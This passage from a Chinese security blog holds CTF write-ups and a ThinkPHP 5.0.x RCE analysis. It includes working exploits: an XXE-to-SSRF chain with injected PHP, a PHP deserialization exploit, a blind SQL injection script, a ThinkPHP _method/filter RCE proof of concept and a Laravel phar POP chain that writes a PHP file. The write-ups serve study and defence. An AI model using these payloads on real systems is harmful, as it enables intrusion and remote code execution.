  if(strlen($data) &gt; 1){
    Custom::Test($data);
  }else{
    Custom::createView(&#39;Custom&#39;);
  }
});

Route::set(&#39;admin&#39;,function(){
  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){
    Admin::createView(&#39;Admin&#39;);
  }else{
    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){
      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);
    }else{
     echo &quot;;(&quot;;
    }
  }
});

Route::set(&#39;custom/sort&#39;,function(){
  Custom::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);
});
Route::set(&#39;index&#39;,function(){
 Index::createView(&#39;Index&#39;);
});</code></pre><p>原来我只下载了download和admin页面，还有其它功能页面没下载到，看到了玄学的admin规则如下，原来只有本地才能请求到sort函数</p>
<pre><code>Route::set(&#39;admin&#39;,function(){
  if(!isset($_REQUEST[&#39;rss&#39;]) &amp;&amp; !isset($_REQUES[&#39;order&#39;])){
    Admin::createView(&#39;Admin&#39;);
  }else{
    if($_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;127.0.0.1&#39; || $_SERVER[&#39;REMOTE_ADDR&#39;] == &#39;::1&#39;){
      Admin::sort($_REQUEST[&#39;rss&#39;],$_REQUEST[&#39;order&#39;]);
    }else{
     echo &quot;;(&quot;;
    }
  }
});</code></pre><p>找一下其他利用，再看Custom</p>
<pre><code>Route::set(&#39;custom&#39;,function(){
  $handler = fopen(&#39;php://input&#39;,&#39;r&#39;);
  $data = stream_get_contents($handler); 
  if(strlen($data) &gt; 1){
    Custom::Test($data);
  }else{
    Custom::createView(&#39;Custom&#39;);
  }
});</code></pre><p>Custom::Test</p>
<pre><code>class Custom extends Controller{
  public static function Test($string){
      $root = simplexml_load_string($string,&#39;SimpleXMLElement&#39;,LIBXML_NOENT);
      $test = $root-&gt;name;
      echo $test;
  }
}</code></pre><p>$data内容可控为php://input，Test函数再将$data作为xml文本解析，那么存在XXE的问题，验证了一下可以利用<br><img src="https://i.loli.net/2019/01/28/5c4e7655ea8f6.png" alt></p>
<p>联想到刚才admin页面只有本地才能请求，那就用Custom的XXE当跳板好了，测试一下是否能当跳板</p>
<p>poc:</p>
<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; 
&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fyour_vps%2Fxxe.txt&amp;order=1&quot;&gt;]&gt;
&lt;note&gt;
&lt;name&gt;&amp;file;&lt;/name&gt;
&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e7677a9567.png" alt><br>admin页面确实file_get_contents到了我vps的xxe文本。</p>
<p>尝试去构造正确的xml文本到执行到usort函数进行注入，warning不影响代码执行</p>
<p><code>http://vps/xxe.txt</code></p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;root&gt;
&lt;channel&gt;
&lt;item&gt;
&lt;link&gt;@hpdoger.me&lt;/link&gt;
&lt;/item&gt;
&lt;item&gt;
&lt;link&gt;@souhu.com&lt;/link&gt;
&lt;/item&gt;
&lt;/channel&gt;
&lt;/root&gt;</code></pre><p><code>POC</code></p>
<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt; 
&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fvps%2Fxxe.txt&amp;order=id%29%3B%7Decho%28file_get_contents%28%27..%2F..%2F..%2Fda0f72d5d79169971b62a479c34198e7%27%29%29%3B%2F%2F&quot;&gt;]&gt;
&lt;note&gt;
&lt;name&gt;&amp;file;&lt;/name&gt;
&lt;/note&gt;</code></pre><p><img src="https://i.loli.net/2019/01/28/5c4e768d57f89.png" alt></p>

                
            </div>
            <div class="continue">
            <a href="/2019/01/30/FireShellCTF2019 Bad Injections解题记录/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/01/26/安恒杯月赛19新年场WriteUp/"> 
                    安恒杯月赛19新年场WriteUp 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-01-26   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="安恒杯月赛19新年场WriteUp"><a href="#安恒杯月赛19新年场WriteUp" class="headerlink" title="安恒杯月赛19新年场WriteUp"></a>安恒杯月赛19新年场WriteUp</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>题目代码</p>
<pre><code>&lt;?php  
@error_reporting(1); 
include &#39;flag.php&#39;;
class baby 
{   
    protected $skyobj;  
    public $aaa;
    public $bbb;
    function __construct() 
    {      
        $this-&gt;skyobj = new sec;
    }  
    function __toString()      
    {          
        if (isset($this-&gt;skyobj))  
            return $this-&gt;skyobj-&gt;read();      
    }  
}  

class cool 
{    
    public $filename;     
    public $nice;
    public $amzing; 
    function read()      
    {   
        $this-&gt;nice = unserialize($this-&gt;amzing);
        $this-&gt;nice-&gt;aaa = $sth;
        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)
        {
            $file = &quot;./{$this-&gt;filename}&quot;;        
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return &quot;you must be joking!&quot;; 
            }    
        }
    }  
}  

class sec 
{  
    function read()     
    {          
        return &quot;it&#39;s so sec~~&quot;;      
    }  
}  

if (isset($_GET[&#39;data&#39;]))  
{ 
    $Input_data = unserialize($_GET[&#39;data&#39;]);
    echo $Input_data; 
} 
else 
{ 
    highlight_file(&quot;./index.php&quot;); 
} 
?&gt;</code></pre><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>考点一：echo可以调用toString()函数用来返回flag.php内容</p>
<p>考点二：让$this-&gt;nice是一个非baby的类，就能绕过$str</p>
<p>考点三：unserialize()不会执行<strong>construct，外部不可控protected变量skyobj，但是序列化时可以放到</strong>construct内部控制</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>class baby 
{   
    protected $skyobj;  
    function __construct() 
    {      
    $this-&gt;skyobj = new cool;
    $this-&gt;skyobj-&gt;amzing = serialize(new sec);
    $this-&gt;skyobj-&gt;filename = &quot;flag.php&quot;;
    }  

}

class sec 
{
    function read(){}
}

class cool 
{ 
    public $filename;     
    public $nice;
    public $amzing; 
}


$test = new baby();
echo urlencode(serialize($test));</code></pre><h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>约束攻击登陆admin</p>
<p>登陆后盲注</p>
<p>EXP</p>
<pre><code>#!/usr/bin/env python
# encoding: utf-8

import requests
import time


def login(payload):
    url = &quot;http://106.12.21.77/Admin/User/Index?search[table]=flag/**/where/**/1/**/and/**/%s&quot; % (payload)
    # print &quot;[+] %s&quot; % (url)
    before_time = time.time()
    cookies = {&#39;PHPSESSID&#39;: &#39;3kus5jrhoqav8te0kf74hglii7&#39;}
    response = requests.get(url, cookies=cookies)
    # content = response.content
    after_time = time.time()
    offset = after_time - before_time
    # print &quot;[*] Offset : %f&quot; % (offset)
    if offset &gt; 2.5:
        return True
    else:
        return False

def main():
    data = &quot;&quot;
    charaters = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
    for i in range(1, 40, 1):
        for j in charaters:
            payload = &quot;if((mid((select/**/flag/**/from/**/flag),%d,1))=&#39;%s&#39;,sleep(3),0)%%23&quot; % (i, j)
            if login(payload):
                data += str(j)
                print &quot;[+] Found : %s&quot; % (data)
                break


if __name__ == &quot;__main__&quot;:
    main()</code></pre><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><pre><code>binwalk -e zhu.jpg</code></pre><p>Stegsolve</p>
<h2 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h2><h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h3><p>volatility一把梭</p>
<pre><code>volatility imageinfo -f memory #分析操作系统
volatility hashdump -f memory --profile=WinXPSP2x86 #查看当前操作系统中的 password hash</code></pre><p><img src="https://i.loli.net/2019/01/26/5c4c0c216b399.jpg" alt></p>
<p>得到管理员hash如下：</p>
<pre><code>Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b:::</code></pre><p>所以<code>c22b315c040ae6e0efee3518d830362b</code>即为管理员密码的md5值，解出来是123456789，再md5一下就行。</p>
<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>内存取证工具 volatility 使用说明：<a href="https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/" target="_blank" rel="noopener">https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/</a></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h2><p>ypau -&gt; flag</p>

                
            </div>
            <div class="continue">
            <a href="/2019/01/26/安恒杯月赛19新年场WriteUp/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/"> 
                    ThinkPHP5.0.0~5.0.23RCE漏洞分析 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-01-20   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="ThinkPHP5-0-0-5-0-23RCE漏洞分析"><a href="#ThinkPHP5-0-0-5-0-23RCE漏洞分析" class="headerlink" title="ThinkPHP5.0.0~5.0.23RCE漏洞分析"></a>ThinkPHP5.0.0~5.0.23RCE漏洞分析</h1><p>最近TP5一直在爆洞，既然浪潮在，就有必要跟进分析一下。但是由于自己对TP5框架流程不是很了解，所以有了这篇边摸索边分析的文章。</p>
<h1 id="TP5框架流程"><a href="#TP5框架流程" class="headerlink" title="TP5框架流程"></a>TP5框架流程</h1><p>应用启动在App.php的run()函数，说一下自己对这个框架的大致理解</p>
<p><strong>用户请求 -&gt; 路由解析 -&gt; 调度请求 -&gt; 执行操作 -&gt; 响应输出</strong></p>
<p><img src="https://i.loli.net/2019/01/20/5c43f7bb2d673.png" alt></p>
<p>App.php代码部分流程如下：  (自己的理解，可能有不对的地方，望斧正<br>1、应用初始化<code>initModule()</code><br>2、run()-&gt;routeCheck()对用户的get请求进行路由检测<br>3、若注册了路由则返回相应的调度值，若路由检测无效(即没有注册路由)则返回调度值为module<br>4、根据调度值，处理不同请求</p>
<pre><code>switch (self::$dispatch[&#39;type&#39;]) {
    case &#39;redirect&#39;:
        header(&#39;Location: &#39; . self::$dispatch[&#39;url&#39;], true, self::$dispatch[&#39;status&#39;]);
        break;

    case &#39;module&#39;:
       $data = self::module(self::$dispatch[&#39;module&#39;], $config);
        break;

    case &#39;controller&#39;:
        $data = Loader::action(self::$dispatch[&#39;controller&#39;], self::$dispatch[&#39;params&#39;]);
        break;

    case &#39;method&#39;:
        $data = self::invokeMethod(self::$dispatch[&#39;method&#39;], self::$dispatch[&#39;params&#39;]);
        break;

    case &#39;function&#39;:
        $data = self::invokeFunction(self::$dispatch[&#39;function&#39;], self::$dispatch[&#39;params&#39;]);
        break;

    default:
        throw new Exception(&#39;dispatch type not support&#39;, 10008);
}</code></pre><p>5、执行处理，返回输出。</p>
<p>TP5中get的路由请求参数为s。若get请求时s参数不存在，则调度类型默认值为module，调度方法实现<code>self::module()</code>，即进入MVC的处理方式：Controller层调用Module处理数据返回给View到用户。</p>
<p>所以核心操作就是调度请求。</p>
<h1 id="回到正题"><a href="#回到正题" class="headerlink" title="回到正题"></a>回到正题</h1><p>这个漏洞的产生是因为对_method参数过滤不严导致$filter变量覆盖</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha

POST:
_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>App.php部分代码：</p>
<pre><code>&lt;?php
/**
* 执行应用程序
* @access public
* @param  Request $request 请求对象
* @return Response
* @throws Exception
*/
public static function run(Request $request = null)
{
    $request = is_null($request) ? Request::instance() : $request;

    try {
        ...
        // 获取应用调度信息
        $dispatch = self::$dispatch;

        // 未设置调度信息则进行 URL 路由检测
        if (empty($dispatch)) {
            $dispatch = self::routeCheck($request, $config);
        }
        ...

        $data = self::exec($dispatch, $config);
    } catch (HttpResponseException $exception) {
        ...
    }
    ...
}</code></pre><p>看到<code>$dispatch = self::routeCheck($request, $config)</code>，$request是http请求对象，通过调用Request类中的method方法来获取当前的http请求类型，该函数的实现在<code>thinkphp/library/think/Request.php:512</code></p>
<pre><code>&lt;?php
/**
    * 当前的请求类型
    * @access public
    * @param bool $method  true 获取原始请求类型
    * @return string
    */
public function method($method = false)
{
    if (true === $method) {
        // 获取原始请求类型
        return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
    } elseif (!$this-&gt;method) {
        if (isset($_POST[Config::get(&#39;var_method&#39;)])) {
            $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);
            $this-&gt;{$this-&gt;method}($_POST);
        } elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) {
            $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);
        } else {
            $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
        }
    }
    return $this-&gt;method;
}</code></pre><p>var_method的伪装变量值为_method<br><img src="https://i.loli.net/2019/01/20/5c43fee616aac.png" alt></p>
<p>因此通过POST一个_method参数，即可进入判断，并执行<code>$this-&gt;{$this-&gt;method}($_POST)</code>语句。因此通过指定_method即可完成对该类的任意方法的调用，其传入对应的参数即对应的$_POST数组。在poc里看到传入的<strong>method为</strong>construct，代码如下</p>
<pre><code>&lt;?php
protected function __construct($options = [])
{
    foreach ($options as $name =&gt; $item) {
        if (property_exists($this, $name)) {
            $this-&gt;$name = $item;
        }
    }
    if (is_null($this-&gt;filter)) {
        $this-&gt;filter = Config::get(&#39;default_filter&#39;);
    }

    // 保存 php://input
    $this-&gt;input = file_get_contents(&#39;php://input&#39;);
}</code></pre><p>利用foreach循环，和POST传入数组即可对Request对象的成员属性进行覆盖。经过覆盖后的结果<br><img src="https://i.loli.net/2019/01/20/5c43f8a3b1ee9.png" alt></p>
<p>这里也就解释了poc中为什么要传入method=get。为了使$this-&gt;method=get才能对应上面Request.php的method()方法返回值，否则程序报错</p>
<p>request对象差不多清楚了，跟进self::routeCheck()</p>
<pre><code>&lt;?php
/**
 * URL路由检测（根据PATH_INFO)
 * @access public
 * @param  \think\Request $request 请求实例
 * @param  array          $config  配置信息
 * @return array
 * @throws \think\Exception
 */
public static function routeCheck($request, array $config)
{
    $path   = $request-&gt;path();  //path=captcha
    $depr   = $config[&#39;pathinfo_depr&#39;];
    $result = false;

    // 路由检测（根据路由定义返回不同的URL调度）
    $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);

    return $result;</code></pre><p>根据$request的get请求进行路由检测，在vendor/topthink/think-captcha/src/helper.php中captcha注册了路由，因此其对应的URL调度值为method<br><img src="https://i.loli.net/2019/01/20/5c43feb394e5f.png" alt></p>
<p>再返回App.php继续执行<code>$data = self::exec($dispatch, $config);</code></p>
<pre><code>&lt;?php
protected static function exec($dispatch, $config)
{
    switch ($dispatch[&#39;type&#39;]) {
        ...
        case &#39;method&#39;: // 回调方法
            $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);
            $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);
            break;
        ...
    }
    return $data;
}</code></pre><p>介绍的，根据调度值的不同处理不同请求，此时我们的dispatch为method。继续跟进<code>Request::instance()-&gt;param()</code></p>
<pre><code>&lt;?php
public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
{
    if (empty($this-&gt;mergeParam)) {
        $method = $this-&gt;method(true);
        ...
    }
    ...
    // 当前请求参数和URL地址中的参数合并
    $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
    $this-&gt;mergeParam = true;
    ...
    return $this-&gt;input($this-&gt;param, $name, $default, $filter);
}</code></pre><p>array_merge用来合并参数，此时$this-&gt;param为一个数组，且第一个值为我们刚才覆盖的get值<br><img src="https://i.loli.net/2019/01/20/5c43f82e8ae5b.png" alt></p>
<p>继续跟进<code>$this-&gt;input($this-&gt;param, $name, $default, $filter)</code></p>
<pre><code>&lt;?php
public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
{
    ...
    // 解析过滤器
    $filter = $this-&gt;getFilter($filter, $default);
    if (is_array($data)) {
        array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
        reset($data);
    }
    ...
}</code></pre><p>跟进getFilter</p>
<pre><code>protected function getFilter($filter, $default)
{
    if (is_null($filter)) {
        $filter = [];
    } else {
        $filter = $filter ?: $this-&gt;filter;
        if (is_string($filter) &amp;&amp; false === strpos($filter, &#39;/&#39;)) {
            $filter = explode(&#39;,&#39;, $filter);
        } else {
            $filter = (array) $filter;
        }
    }

    $filter[] = $default;
    return $filter;
}</code></pre><p>到这逻辑就很清楚了，在input函数里面获得$filter值为我们之前覆盖的$this-&gt;filter，$data是实参传入的$this-&gt;param数组，接着调用 array_walk_recursive()进行自定义函数处理，函数名为filterValue()<br><img src="https://i.loli.net/2019/01/20/5c43f84376fdb.png" alt></p>
<p>从而调用call_user_func进行RCE</p>
<h1 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h1><p>看一下diff<br><img src="https://i.loli.net/2019/01/20/5c43f86c5eec1.png" alt></p>
<p>触发漏洞点就是method可控，进而调用任意函数。补丁对参数method进行了白名单</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://xz.aliyun.com/t/3845#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-1</a></li>
<li><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></li>
<li><a href="https://www.kancloud.cn/zmwtp/tp5/119426" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119426</a></li>
<li><a href="https://www.kancloud.cn/zmwtp/tp5/119428" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119428</a></li>
</ol>

                
            </div>
            <div class="continue">
            <a href="/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/01/09/Code-breaking-medium֮lumenserial/"> 
                    Code-breaking-medium之lumenserial 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-01-09   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="Code-breaking-medium之lumenserial"><a href="#Code-breaking-medium之lumenserial" class="headerlink" title="Code-breaking-medium之lumenserial"></a>Code-breaking-medium之lumenserial</h1><p>一道pop链很深的题，复现了一天，到目前已经有九个人做了。太菜了，只能照着柠檬和kk师傅的wp来学习思路。通过这次的复现，感受到耐心对审计的importance。记录一下在学习wp过程中得到的他见与己见。</p>
<p>题目地址：<a href="https://code-breaking.com/puzzle/7/" target="_blank" rel="noopener">https://code-breaking.com/puzzle/7/</a></p>
<h1 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h1><p>一个ueditor的页面</p>
<p>在App\Http\Controllers的EditorController.php里提供了远程下载功能</p>
<pre><code>private function download($url)
{
    $content = file_get_contents($url);</code></pre><p>url可控为以GET形式传入的source值，由于禁止了以下函数，所以只能利用Phar反序列化再打通pop链</p>
<pre><code>system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</code></pre><h1 id="Searching-POP-chain"><a href="#Searching-POP-chain" class="headerlink" title="Searching POP chain"></a>Searching POP chain</h1><p>因为phar反序列化不会反序列化类中的具体函数，所以要找两个魔法方法入口：<code>__destruct|__wakeup</code>这点在柠檬师傅的博客园看到的，也算是经验之谈了。</p>
<p>首先在namespace Illuminate\Broadcasting里找到PendingBroadcast类存在destruct</p>
<pre><code>class PendingBroadcast
{   
public function __construct(Dispatcher $events, $event)
{
    $this-&gt;event = $event;
    $this-&gt;events = $events;
}
public function __destruct()
    {
        $this-&gt;events-&gt;dispatch($this-&gt;event);
    }
}</code></pre><p>Dispatcher是一个接口，所以这里$event、$events应该都是一个继承于这个接口的obj。但是看了下，一共就只有两个类继承于Dispatcher(BusFake、EventFake)，且都无法利用。所以转向去寻找存在__call方法的类，看是否可以利用。</p>
<p>为什么要找存在_call方法的类的？根据PHP文档，当一个类里没有定义的方法时，在执行这个不存在方法时，它就会自动调用该类里的__call方法来实现方法重载。</p>
<p>所以要找一个有_call方法的类–&gt;类ValidGenerator。</p>
<h1 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h1><pre><code>public function __call($name, $arguments)
{
    $i = 0;
    do {
        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
        $i++;
        if ($i &gt; $this-&gt;maxRetries) {
            throw new \OverflowException(sprintf(&#39;Maximum retries of %d reached without finding a valid value&#39;, $this-&gt;maxRetries));
        }
    } while (!call_user_func($this-&gt;validator, $res));

    return $res;
}</code></pre><p>$name的值就是dispatch。如果我们能控制$res，就相当于能控制call_user_func的函数和参数</p>
<p>由于在call_user_func_array()中，Generator类没有定义dispatch函数，所以又会调用Generator类的_call函数，跟进Generator类</p>
<h1 id="Generator类"><a href="#Generator类" class="headerlink" title="Generator类"></a>Generator类</h1><pre><code>public function __call($method, $attributes) 
{
    return $this-&gt;format($method, $attributes);
}</code></pre><p>继续跟进format方法</p>
<pre><code>public function format($formatter, $arguments = array())
{
    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);  
}</code></pre><p>$formatter的值不可控，且初值为dispatch，继续跟进getFormatter()</p>
<pre><code>public function getFormatter($formatter)
{
    if (isset($this-&gt;formatters[$formatter])) {
        return $this-&gt;formatters[$formatter];
    }</code></pre><p>在这步似乎看到了希望，因为它return 了一个数组的值，就比较好控。想办法让<strong>$this-&gt;getFormatter($formatter)</strong>的值是一个数组，即第一次<strong>getFormatter()</strong>返回的值是数组。数组只有一个值仍为<strong>getFormatter</strong>，此时$arguemnts为空，因为call_user_func_array，它就会再调用一次getFormatter方法，参数为空。</p>
<p>根据getFormatter方法当参数为空时，返回formatters成员的第一个值。</p>
<p>所以我们需要有两个Generator类：第一个类的formatters成员的键名为dispacth，键值为一个数组(内容为第二个Generator类名$ob2、方法名getFormatter);第二个Generator类的formatters键名随意，键值为我们想要控制的类,此时$res就算可控了。</p>
<h1 id="回身处理validator"><a href="#回身处理validator" class="headerlink" title="回身处理validator"></a>回身处理validator</h1><p>那么$this-&gt;validator如何处理呢？</p>
<p>这里看到师傅们找的了一个跳板类，赋值给了validator</p>
<p><code>phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:26</code></p>
<pre><code>namespace PHPUnit\Framework\MockObject\Stub;
class ReturnCallback implements Stub
{
public function invoke(Invocation $invocation)
{
    return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());
}</code></pre><h2 id="invocation接口实现方法"><a href="#invocation接口实现方法" class="headerlink" title="invocation接口实现方法"></a>invocation接口实现方法</h2><p>getParameters()是接口的一个方法，用来访问私有属性parameters的值</p>
<p>找到调用这个接口的类就行了，这里是</p>
<pre><code>namespace PHPUnit\Framework\MockObject\Invocation;
class StaticInvocation implements Invocation, SelfDescribing
{
private $parameters;
}</code></pre><p>这个类可以通过上面getFormatter方法控制。至此，invoke()里call_user_func_array中的两个参数我们都可控了</p>
<h2 id="构建POC思路"><a href="#构建POC思路" class="headerlink" title="构建POC思路"></a>构建POC思路</h2><p>给validator一个数组(内容为实例化的ReturenCallback类、invoke方法名)。即$this-&gt;validator参数就成了invoke()，从而让call_user_func调用invoke方法，invoke方法中的Call_user_func_arrary再执行可控函数来getshell</p>
<p>总结一下，Invoke的回调函数能getshell的原因有二：<br>1、$this-&gt;callback 反序列化可控<br>2、继承invocation的类名返回值可控(getFormatter实现)</p>
<h1 id="Final-EXP"><a href="#Final-EXP" class="headerlink" title="Final-EXP"></a>Final-EXP</h1><p>看到kk师傅有一个exp写的很好，把审计流程串成EXP，稍作改动，这里贴出来学习下</p>
<pre><code>&lt;?php
namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        function __construct(){
            $this-&gt;events = new \Faker\ValidGenerator();
            $this-&gt;event = &#39;everything&#39;;
        }
    }
}

namespace PHPUnit\Framework\MockObject\Invocation{
    class StaticInvocation{
        function __construct(){
            $this-&gt;parameters = array(&#39;/var/www/html/upload/hpdoger.php&#39;,&#39;&lt;?php print_r(file_get_contents(&#39;../../flag_larave1_b0ne&#39;));?&gt;&#39;);
        }
    }
}

namespace PHPUnit\Framework\MockObject\Stub{
    class ReturnCallback{
        function __construct(){
            $this-&gt;callback = &#39;file_put_contents&#39;;
        }
    }
}

namespace Faker{
    class ValidGenerator{
        function __construct(){
            $evilobj = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();
            $g1 = new \Faker\Generator(array(&#39;everything&#39; =&gt; $evilobj ));
            $g2 = new \Faker\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;)));

            $rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();

            $this-&gt;validator = array($rc, &quot;invoke&quot;);
            $this-&gt;generator = $g2;
            $this-&gt;maxRetries = 10000;
        }
    }

    class Generator{
        function __construct($form){
            $this-&gt;formatters = $form;
        }
    }

}
namespace{
    $exp = new Illuminate\Broadcasting\PendingBroadcast();
    print_r(urlencode(serialize($exp)));

    // phar
    $p = new Phar(&#39;./hpdoger.phar&#39;, 0);
    $p-&gt;startBuffering();
    $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
    $p-&gt;setMetadata($exp);
    $p-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;);
    $p-&gt;stopBuffering();
}</code></pre><p>上传文件，接着进行反序列化</p>
<pre><code>http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/9af04fac3af8c9d11572234ca3c4c98b/201901/09/26b5b639d9f75a9426cf.gif</code></pre><p><img src="https://i.loli.net/2019/01/09/5c35f967d6ab3.png" alt></p>
<p>再次膜前辈师傅们</p>

                
            </div>
            <div class="continue">
            <a href="/2019/01/09/Code-breaking-medium֮lumenserial/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/01/07/从两道CTF题目学习XXE漏洞/"> 
                    从两道CTF题目学习XXE漏洞 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-01-07   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="从两道CTF题目学习XXE漏洞"><a href="#从两道CTF题目学习XXE漏洞" class="headerlink" title="从两道CTF题目学习XXE漏洞"></a>从两道CTF题目学习XXE漏洞</h1><p>接触安全到现在，一直没有碰xxe相关的知识。一是觉得xml类型的东西太概念化了，二是觉得实用性不大，因为现在很少见到用xml形式来传输数据。不巧的是最近35CTF就有一道blind xxe题目，干脆把之前的坑填了，从零来学习一下XXE漏洞</p>
